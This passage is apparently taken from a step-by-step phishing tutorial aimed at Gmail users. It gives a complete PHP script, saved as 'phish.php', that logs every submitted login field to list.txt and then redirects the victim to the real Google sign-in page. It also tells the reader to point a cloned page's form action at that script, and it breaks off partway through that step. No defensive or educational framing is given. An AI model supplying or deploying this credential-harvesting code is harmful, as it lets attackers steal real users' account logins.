+   4. **Create a script** – You should create a computer script that will record the user’s login information. Most hackers use the PHP scripting language to accomplish this task. The image below shows you a basic PHP script that records login credentials.

Launch Notepad and enter the script. Save the file as “phish.php”.

```
```php
<?php
Header("Location:
https://www.google.com/accounts/ServiceLogin?service=mail&passive=
true&rm=false&continue=http%3A%2F%2Fmail.google.com%2Fmail%2F
%3Ffu%3Dhtml%26zy%3D1&bsv=1k9b6f94806cy&ltmpl=default&ltmplcache=2");

$handle = fopen("list.txt", "a");

Foreach($_GET as $variable => $value){
    fwrite($handle, $variable);
    fwrite($handle, "=");
    fwrite($handle, $value);
    fwrite($handle, "\r\n");
}

Fwrite($handle, "\r\n");
fclose($handle);

exit;
?>
```
```

+   5. **Create an empty .txt file** and save it as “list.txt”.

+   6. **Add the script to the webpage** – Use the file named index.htm using Notepad. Press CTRL+F, type “action”, and click on “Find Next”. Here’s a screenshot:

![](bbox=[0.134, 0.754, 0.568, 0.891])

Look for “action” in the script’s “form id” section. You’ll see a URL there – delete